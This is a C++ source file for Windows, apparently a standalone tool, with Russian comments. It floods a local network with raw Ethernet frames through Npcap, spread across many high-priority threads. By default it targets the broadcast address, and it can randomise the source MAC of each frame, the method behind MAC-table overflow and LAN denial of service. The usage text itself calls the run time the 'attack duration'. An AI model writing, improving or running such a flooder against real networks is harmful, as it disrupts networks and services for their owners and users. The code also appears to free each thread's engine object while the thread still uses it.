// mac.cpp – Ethernet flood с автоопределением интерфейса по наличию IP
// Компиляция: g++ -o mac.exe mac.cpp -I"./Include" -L"./Lib/x64" -lwpcap -lws2_32 -liphlpapi
#define HAVE_REMOTE
#include <pcap.h>
#include <iostream>
#include <vector>
#include <thread>
#include <atomic>
#include <chrono>
#include <memory>
#include <cstring>
#include <cstdint>
#include <cstdlib>
#include <ctime>
#include <cstdio>
#include <winsock2.h>
#include <iphlpapi.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")

#pragma pack(push, 1)
struct ether_header {
    uint8_t  ether_dhost[6];
    uint8_t  ether_shost[6];
    uint16_t ether_type;
};
#pragma pack(pop)

// Вспомогательные функции
bool get_local_mac(uint32_t ip, uint8_t mac[6]) {
    DWORD dwSize = 0;
    PIP_ADAPTER_INFO pAdapterInfo = nullptr;
    if (GetAdaptersInfo(nullptr, &dwSize) == ERROR_BUFFER_OVERFLOW) {
        pAdapterInfo = (IP_ADAPTER_INFO*)malloc(dwSize);
        if (GetAdaptersInfo(pAdapterInfo, &dwSize) == NO_ERROR) {
            PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
            while (pAdapter) {
                IP_ADDR_STRING* pIp = &pAdapter->IpAddressList;
                while (pIp) {
                    if (inet_addr(pIp->IpAddress.String) == ip) {
                        memcpy(mac, pAdapter->Address, 6);
                        free(pAdapterInfo);
                        return true;
                    }
                    pIp = pIp->Next;
                }
                pAdapter = pAdapter->Next;
            }
        }
        free(pAdapterInfo);
    }
    return false;
}

std::string get_interface_name(uint32_t ip) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_if_t *alldevs, *dev;
    if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, nullptr, &alldevs, errbuf) == -1)
        return "";
    for (dev = alldevs; dev; dev = dev->next) {
        pcap_addr_t *addr;
        for (addr = dev->addresses; addr; addr = addr->next) {
            if (addr->addr && addr->addr->sa_family == AF_INET) {
                struct sockaddr_in *sin = (struct sockaddr_in*)addr->addr;
                if (sin->sin_addr.s_addr == ip) {
                    std::string name = dev->name;
                    pcap_freealldevs(alldevs);
                    return name;
                }
            }
        }
    }
    pcap_freealldevs(alldevs);
    return "";
}

bool parse_mac_strict(const char* str, uint8_t mac[6]) {
    unsigned int tmp[6] = {};
    int consumed = 0;
    if (sscanf(str, "%2x:%2x:%2x:%2x:%2x:%2x%n",
               &tmp[0], &tmp[1], &tmp[2], &tmp[3], &tmp[4], &tmp[5], &consumed) != 6) {
        return false;
    }
    if (str[consumed] != '\0') {
        return false;
    }
    for (int i = 0; i < 6; ++i) {
        mac[i] = static_cast<uint8_t>(tmp[i]);
    }
    return true;
}

void print_mac(const uint8_t mac[6]) {
    for (int i = 0; i < 6; ++i) {
        if (i) std::printf(":");
        std::printf("%02X", mac[i]);
    }
    std::printf("\n");
}

// Функция для получения первого Ethernet-интерфейса, у которого есть IP-адрес
std::string get_default_interface() {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_if_t *alldevs;
    if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, nullptr, &alldevs, errbuf) == -1) {
        std::cerr << "pcap_findalldevs_ex error: " << errbuf << std::endl;
        return "";
    }

    std::string result;
    std::string chosen_ip;

    for (pcap_if_t *d = alldevs; d; d = d->next) {
        // Пропускаем интерфейсы без адресов
        if (!d->addresses) continue;

        // Открываем временный дескриптор, чтобы узнать тип линка
        pcap_t *temp = pcap_open(d->name, 65536, PCAP_OPENFLAG_MAX_RESPONSIVENESS, 1000, nullptr, errbuf);
        if (!temp) continue;

        int linktype = pcap_datalink(temp);
        pcap_close(temp);

        if (linktype != DLT_EN10MB) continue; // только Ethernet

        // Ищем любой ненулевой IPv4-адрес
        for (pcap_addr_t *a = d->addresses; a; a = a->next) {
            if (a->addr && a->addr->sa_family == AF_INET) {
                struct sockaddr_in *sin = (struct sockaddr_in*)a->addr;
                if (sin->sin_addr.s_addr != 0) {
                    result = d->name;
                    chosen_ip = inet_ntoa(sin->sin_addr);
                    break;
                }
            }
        }
        if (!result.empty()) break;
    }

    pcap_freealldevs(alldevs);

    if (!result.empty()) {
        std::cout << "Auto-selected interface: " << result
                  << " with IP " << chosen_ip << std::endl;
    }
    return result;
}

// Предварительно собранный Ethernet-кадр
class PrebuiltPacket {
public:
    static constexpr size_t PACKET_SIZE = sizeof(ether_header);
    alignas(64) uint8_t buffer[PACKET_SIZE];
    size_t size;
    size_t src_mac_offset;
    uint8_t dst_mac[6];

    PrebuiltPacket(uint8_t* dst_mac) {
        size = PACKET_SIZE;
        memset(buffer, 0, size);
        ether_header* eth = (ether_header*)buffer;
        memcpy(eth->ether_dhost, dst_mac, 6);
        eth->ether_type = htons(0x0800); // можно любой (IP, ARP...)
        src_mac_offset = offsetof(ether_header, ether_shost);
    }

    void set_src_mac(const uint8_t mac[6]) {
        memcpy(buffer + src_mac_offset, mac, 6);
    }
};

class FloodEngine {
private:
    pcap_t* pcap_handle;
    PrebuiltPacket packet_template;
    std::atomic<uint64_t>& total_packets_sent;
    std::atomic<bool>& stop_flag;
    bool random_mac;

public:
    FloodEngine(pcap_t* handle, uint8_t* dst_mac, std::atomic<uint64_t>& total_counter,
                std::atomic<bool>& stop, bool random_mac_flag)
        : packet_template(dst_mac), pcap_handle(handle),
          total_packets_sent(total_counter), stop_flag(stop),
          random_mac(random_mac_flag) {}

    void start(int core_id) {
        HANDLE hThread = GetCurrentThread();
        SetThreadAffinityMask(hThread, 1ULL << core_id);
        SetThreadPriority(hThread, THREAD_PRIORITY_HIGHEST);

        uint32_t seed = time(nullptr) + core_id * 1000;
        auto lcg = [](uint32_t& s) -> uint32_t {
            s = s * 1103515245 + 12345;
            return (s >> 16) & 0x7FFF;
        };

        while (!stop_flag.load(std::memory_order_relaxed)) {
            if (random_mac) {
                uint8_t mac[6];
                mac[0] = (lcg(seed) & 0xFE); // unicast
                for (int i = 1; i < 6; ++i) {
                    mac[i] = lcg(seed) & 0xFF;
                }
                packet_template.set_src_mac(mac);
            }

            if (pcap_sendpacket(pcap_handle, packet_template.buffer, (int)packet_template.size) == 0) {
                total_packets_sent.fetch_add(1, std::memory_order_relaxed);
            } else {
                static thread_local uint32_t error_counter = 0;
                if ((++error_counter % 1000) == 1) {
                    std::cerr << "pcap_sendpacket error in thread " << std::this_thread::get_id()
                              << ": " << pcap_geterr(pcap_handle) << std::endl;
                }
            }
        }
    }
};

// Вывод статистики в JSON (для интеграции с GUI)
void print_stats(uint64_t packets, double elapsed, double pps) {
    std::cout << "{\"type\":\"stats\",\"packets\":" << packets
              << ",\"time\":" << elapsed
              << ",\"pps\":" << static_cast<int>(pps) << "}" << std::endl;
}

int main(int argc, char* argv[]) {
    // Проверка минимального количества аргументов: нужно хотя бы 3: <interface или auto> <threads> <duration>
    if (argc < 4) {
        std::cerr << "Usage: " << argv[0]
                  << " <interface|auto> <threads> <duration_sec> [dst_mac] [--random-mac]\n"
                  << "  interface   - network interface name, or 'auto' for automatic selection\n"
                  << "  threads     - number of threads\n"
                  << "  duration_sec- attack duration in seconds (0 for infinite)\n"
                  << "  dst_mac     - destination MAC (optional, default broadcast)\n"
                  << "  --random-mac- generate random source MAC for each packet\n";
        return 1;
    }

    std::string ifname;
    // Определяем интерфейс
    if (strcmp(argv[1], "auto") == 0 || strcmp(argv[1], "AUTO") == 0) {
        ifname = get_default_interface();
        if (ifname.empty()) {
            std::cerr << "No suitable Ethernet interface with IP address found automatically." << std::endl;
            return 1;
        }
        // Вывод уже есть внутри функции, можно не дублировать
    } else {
        ifname = argv[1];
    }

    int num_threads = atoi(argv[2]);
    int duration = atoi(argv[3]);

    uint8_t dst_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    bool random_mac = false;

    for (int i = 4; i < argc; i++) {
        if (strcmp(argv[i], "--random-mac") == 0) {
            random_mac = true;
        } else {
            uint8_t parsed_mac[6];
            if (parse_mac_strict(argv[i], parsed_mac)) {
                memcpy(dst_mac, parsed_mac, 6);
            } else {
                std::cerr << "Warning: unknown argument '" << argv[i] << "'\n";
            }
        }
    }

    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);

    char errbuf[PCAP_ERRBUF_SIZE];
    if (pcap_init(PCAP_CHAR_ENC_UTF_8, errbuf) == -1) {
        std::cerr << "pcap_init failed: " << errbuf << std::endl;
        return 1;
    }

    // Проверка типа линка
    pcap_t* temp = pcap_open(ifname.c_str(), 65536, PCAP_OPENFLAG_MAX_RESPONSIVENESS, 1000, nullptr, errbuf);
    if (!temp) {
        std::cerr << "pcap_open failed: " << errbuf << std::endl;
        return 1;
    }
    if (pcap_datalink(temp) != DLT_EN10MB) {
        std::cerr << "Interface doesn't support Ethernet frames" << std::endl;
        pcap_close(temp);
        return 1;
    }
    pcap_close(temp);

    std::vector<pcap_t*> handles;
    for (int i = 0; i < num_threads; i++) {
        pcap_t* h = pcap_open(ifname.c_str(), 65536, PCAP_OPENFLAG_MAX_RESPONSIVENESS, 1000, nullptr, errbuf);
        if (!h) {
            std::cerr << "Failed to open interface for thread " << i << ": " << errbuf << std::endl;
            for (auto hh : handles) pcap_close(hh);
            return 1;
        }
        handles.push_back(h);
    }

    std::atomic<uint64_t> total_packets_sent(0);
    std::atomic<bool> stop_flag(false);

    std::vector<std::thread> workers;
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    DWORD numCores = sysInfo.dwNumberOfProcessors;

    auto start_time = std::chrono::steady_clock::now();

    for (int i = 0; i < num_threads; i++) {
        int core = i % numCores;
        auto engine = std::make_unique<FloodEngine>(handles[i], dst_mac, total_packets_sent, stop_flag, random_mac);
        workers.emplace_back(&FloodEngine::start, engine.get(), core);
    }

    // Поток статистики (каждую секунду)
    std::thread stats_thread([&]() {
        uint64_t last_packets = 0;
        auto last_time = start_time;
        while (!stop_flag.load(std::memory_order_relaxed)) {
            std::this_thread::sleep_for(std::chrono::seconds(1));
            auto now = std::chrono::steady_clock::now();
            double elapsed = std::chrono::duration<double>(now - start_time).count();
            uint64_t packets = total_packets_sent.load(std::memory_order_relaxed);
            double pps = (packets - last_packets) / (elapsed - std::chrono::duration<double>(last_time - start_time).count());
            print_stats(packets, elapsed, pps);
            last_packets = packets;
            last_time = now;
        }
    });

    if (duration > 0) {
        std::this_thread::sleep_for(std::chrono::seconds(duration));
        stop_flag = true;
    } else {
        std::cout << "Press Enter to stop..." << std::endl;
        std::cin.get();
        stop_flag = true;
    }

    stats_thread.join();
    for (auto& w : workers) w.join();

    auto end_time = std::chrono::steady_clock::now();
    auto elapsed_ms = std::chrono::duration_cast<std::chrono::milliseconds>(end_time - start_time).count();
    uint64_t total = total_packets_sent.load();
    double pps = elapsed_ms ? total * 1000.0 / elapsed_ms : 0;
    double mbps = pps * sizeof(ether_header) * 8 / 1'000'000;

    std::cout << "\n--- Results ---\n";
    std::cout << "Total packets sent: " << total << "\n";
    std::cout << "Duration: " << elapsed_ms << " ms\n";
    std::cout << "Throughput: " << pps << " pps\n";
    std::cout << "Bandwidth: " << mbps << " Mbps\n";

    for (auto h : handles) pcap_close(h);
    return 0;
}